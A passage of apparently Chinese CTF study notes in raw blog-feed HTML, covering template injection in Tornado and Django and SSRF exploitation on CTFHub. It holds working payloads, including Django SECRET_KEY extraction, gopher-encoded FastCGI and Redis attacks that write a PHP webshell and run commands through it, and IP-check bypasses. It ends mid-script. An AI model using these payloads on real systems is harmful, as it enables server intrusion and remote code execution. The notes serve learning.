render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.template</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line">TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt; Hello max &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        name = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        template_data = TEMPLATE.replace(<span class="string">&quot;FOO&quot;</span>,name)</span><br><span class="line">        t = tornado.template.Template(template_data)</span><br><span class="line">        <span class="variable language_">self</span>.write(t.generate(name=name))</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([(<span class="string">r&quot;/&quot;</span>, MainHandler),], debug=<span class="literal">True</span>, static_path=<span class="literal">None</span>, template_path=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    application.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure></div><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>在tornado模板中，存在一些可以访问的快速对象，比如 <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>，这个其实就是handler.settings对象，里面存储着一些环境变量</p><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>先看存在漏洞的代码：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)</span><br><span class="line">    return HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure></div><p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p><p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5960ldw74j211809k40e.jpg"                      alt="image-20220817022432341"                ><figcaption>image-20220817022432341</figcaption></figure></p><p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Java中的SSTI"><a href="#Java中的SSTI" class="headerlink" title="Java中的SSTI"></a>Java中的SSTI</h2><p>java常见的引擎：FreeMarker， velocity</p><h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p><strong>语句标识符</strong></p><p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p><p><strong>变量</strong></p><p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p><p><strong>声明</strong></p><p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($a =&quot;velocity&quot;)</span><br><span class="line">#set($b=1)</span><br><span class="line">#set($arrayName=[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure></div><p><strong>注释</strong></p><p>单行注释为##，多行注释为成对出现的#* …………. *#</p><p><strong>条件语句</strong></p><p>以if&#x2F;else为例：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;/strong&gt;</span><br><span class="line">#elseif($foo==10)</span><br><span class="line">    &lt;strong&gt;2&lt;/strong&gt;</span><br><span class="line">#elseif($bar==6)</span><br><span class="line">    &lt;strong&gt;3&lt;/strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;/strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure></div><p> <strong>转义字符</strong></p><p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p>&#x2F;&#x2F;待补充</p><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h2><p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具</p><h3 id="FreeMarker模板代码："><a href="#FreeMarker模板代码：" class="headerlink" title="FreeMarker模板代码："></a><strong>FreeMarker模板代码</strong>：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;　&lt;#-这是注释-&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href=&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;/a&gt;!</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p><p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p><h3 id="主要"><a href="#主要" class="headerlink" title="主要"></a>主要</h3><p>&#x2F;&#x2F;待补充</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web.ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF学习</title>
      <link href="/2022/04/01/SSRF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/01/SSRF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF学习"><a href="#SSRF学习" class="headerlink" title="SSRF学习"></a>SSRF学习</h1><h2 id="0x01-ssrf基础"><a href="#0x01-ssrf基础" class="headerlink" title="0x01 ssrf基础"></a>0x01 ssrf基础</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) </p><p>成因：服务器没有对目标地址做过滤与限制</p><p>形成环节：安全的网站应接收请求后，检测请求的合法性</p><p>攻击目标：从外网无法访问的内部系统，内网</p><h2 id="0x02-ctfhub内技能树"><a href="#0x02-ctfhub内技能树" class="headerlink" title="0x02 ctfhub内技能树"></a>0x02 ctfhub内技能树</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>直接利用http协议访问</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></div><p>如果有对内网IP进行检测，可以用<code>地址解析</code>绕过</p><p>curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。</p><p>url_parse会解析成baidu.com</p><p>而curl会请求127.0.0.1</p><p>高版本中的PHP中修复了但是可以加端口号绕过</p><p>因此我们可以利用该特性构造payload</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://abc@127.0.0.1:80@example.com/flag.php </span><br></pre></td></tr></table></figure></div><p>在check_inner_ip函数内认为hostname是example.com，但curl请求127.0.0.1:80&#x2F;flag.php，成功获取flag</p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>PHP支持的伪协议</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) </span><br><span class="line">URLsphp:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</span><br><span class="line">php://filter:filter过滤流</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></div><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>在SSRF中，dict协议与http协议可以用来探测内网主机存活与端口开放情况。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:8000</span><br></pre></td></tr></table></figure></div><p>用burp，在intruder中，将端口设置为变量。使用Simple List扫描常用端口，或者使用NumerList进行枚举。当发现长度不同的数据包时，再用<code>http</code>协议进一步探测。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1:8987</span><br></pre></td></tr></table></figure></div><h3 id="前置知识：Gopher协议的利用"><a href="#前置知识：Gopher协议的利用" class="headerlink" title="前置知识：Gopher协议的利用"></a>前置知识：Gopher协议的利用</h3><p>什么是gopher协议</p><p><code>gopher</code>协议是一种信息查找系统，他将<code>Internet</code>上的文件组织成某种索引，方便用户从<code>Internet</code>的一处带到另一处。在<code>WWW</code>出现之前，<code>Gopher</code>是<code>Internet</code>上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<code>tcp 70</code>端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher 协议的格式：gopher://IP:port/_TCP/IP数据流</span><br></pre></td></tr></table></figure></div><p>gopher协议发送http get请求</p><blockquote><p>构造<code>HTTP</code>数据包</p><p><code>URL</code>编码、替换回车换行为<code>%0d%0a</code>，<code>HTTP</code>包最后加<code>%0d%0a</code>代表消息结束</p><p>发送<code>gopher</code>协议, 协议后的<code>IP</code>一定要接端口</p></blockquote><p>发送http post请求</p><blockquote><p><code>POST</code>与<code>GET</code>传参的区别：它有<code>4</code>个参数为必要参数</p><p>需要传递<code>Content-Type</code>,<code>Content-Length</code>,<code>host</code>,<code>post</code>的参数</p></blockquote><h3 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h3><p>利用gopher协议构造POST请求</p><p><code>urllib.parse</code>用于解析URL</p><p><code>urllib.parse.quote()</code>对URL中的特殊字符进行编码</p><p><code>replace()</code>替换字符串</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=c384d200658f258e5b5c681bf0aa29a8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># 这里因为是GET请求使用gopher协议，所以要进行两次url编码</span></span><br></pre></td></tr></table></figure></div><p><strong>注意：上面那四个参数是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。</strong></p><p>注意<strong>Content-Length应为POST数据内容的长度</strong>，这里为36(即字符串“key&#x3D;c384d200658f258e5b5c681bf0aa29a8”的长度)。</p><p>因为<code>urllib.parse.quote()</code>会将换行编码为<code>%0A</code>，而在gopher协议中，进行URL编码，会将回车换行编码为<code>%0d%0a</code>，所以，第二步使用<code>replace()</code>将<code>%0A</code>替换为<code>%0D%0A</code>。接下来，拼接上gopher协议的标准格式，最后再使用一次<code>urllib.parse.quote()</code>对新增的部分进行URL编码。因为新增的部分不是POST数据包的内容，所以也就不存在回车换行，也就不需要将<code>%0A</code>替换为<code>%0D%0A</code>。</p><p>标准gopher协议的格式如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Da68a3b03e80ce7fef96007dfa01dc077%250D%250A</span><br></pre></td></tr></table></figure></div><h3 id="提交文件"><a href="#提交文件" class="headerlink" title="提交文件"></a>提交文件</h3><p>首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------256165401027520231274027094134</span></span><br><span class="line"><span class="string">Content-Length: 357</span></span><br><span class="line"><span class="string">Origin: http://challenge-0a06816bc1b6ad0c.sandbox.ctfhub.com:10800</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://challenge-0a06816bc1b6ad0c.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------256165401027520231274027094134</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------256165401027520231274027094134</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交查询</span></span><br><span class="line"><span class="string">-----------------------------256165401027520231274027094134--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><h3 id="攻击FastCGI协议"><a href="#攻击FastCGI协议" class="headerlink" title="攻击FastCGI协议"></a>攻击FastCGI协议</h3><p>使用 <a class="link"   href="https://github.com/tarunkant/Gopherus" >Gopherus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具生成攻击FastCGI的payload</p><p>利用条件：</p><ul><li>libcurl版本&gt;&#x3D;7.45.0</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;&#x3D; 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1k54nnda4j210s0ouwnb.jpg"                      alt="image-20220424005333748"                ><figcaption>image-20220424005333748</figcaption></figure></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH134%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%86%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%20%7C%20base64%20-d%20%3E%20/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure></div><p>需要将生成的payload再进行一次url编码</p><blockquote><p>因为GET会进行一次解码，curl也会进行一次解码</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520%2Fvar%2Fwww%2Fhtml%2Fshell.php%2527%2529%253Bdie%2528%2527</span><br></pre></td></tr></table></figure></div><h3 id="攻击Redis协议"><a href="#攻击Redis协议" class="headerlink" title="攻击Redis协议"></a>攻击Redis协议</h3><p><a class="link"   href="https://www.freebuf.com/articles/web/249238.html" >Redis系列漏洞总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>主要利用redis未授权访问，如：写ssh-keygen公钥登录，利用计划任务反弹shell，直接写webshell等，主从复制getshell。</p><p>端口扫描到redis运行的端口，报错⬇️</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY) +OK</span><br></pre></td></tr></table></figure></div><p>利用Gopherus工具生成payload</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1kvax2gx5j20z80u0jzz.jpg"                      alt="image-20220424155918789"                ><figcaption>image-20220424155918789</figcaption></figure></p><p>再经过一次url编码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure></div><blockquote><p>传入后虽然显示504，但已经成功传入，直接访问网站下shell.php，虽然有乱码，但可以通过shell.php?cmd&#x3D;来执行系统命令,用+绕过空格,默认产生的shell是使用<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c64563873ed3afbf.sandbox.ctfhub.com:10800/shell.php?cmd=ls+/</span><br><span class="line">http://challenge-c64563873ed3afbf.sandbox.ctfhub.com:10800/shell.php?cmd=cat+/flag_a60ba40eae368b2c15d0a8e4a3a13dfd</span><br></pre></td></tr></table></figure></div><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>@绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://题目要求包含的网址@实际想访问的网址</span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></div><h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>进制转换脚本</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span 